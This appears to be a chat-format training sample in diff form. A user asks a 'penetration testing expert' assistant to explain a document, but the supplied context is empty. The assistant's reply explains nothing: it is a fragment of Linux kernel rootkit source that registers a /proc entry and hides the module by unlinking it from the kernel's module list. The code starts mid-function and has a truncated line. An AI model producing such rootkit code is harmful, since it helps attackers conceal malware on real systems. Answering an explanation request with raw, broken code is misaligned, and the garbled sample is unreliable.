@@ -1,0 +1,33 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Provide a clear, comprehensive explanation of the following content: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+return single_open(file, rootkit_show, NULL);
+}
+static const struct file_operations rootkit_fops = {
+.owner = THIS_MODULE,
+.open = rootkit_open,
+.read = seq_read,
+.llseek = seq_lseek,
+.release = single_release,
+};
+static int __init rootkit_init(void) {
+proc_entry = proc_create("rootkit", 0, NULL, &root
+if (!proc_entry) {
+return -ENOMEM;
+}
+// Hide the rootkit process
+prev_proc = THIS_MODULE->list.prev;
+list_del(&THIS_MODULE->list);
+return 0;
+}
+static void __exit rootkit_exit(void) {
+proc_remove(proc_entry);
+// Restore the rootkit process
+list_add(&THIS_MODULE->list, prev_proc);
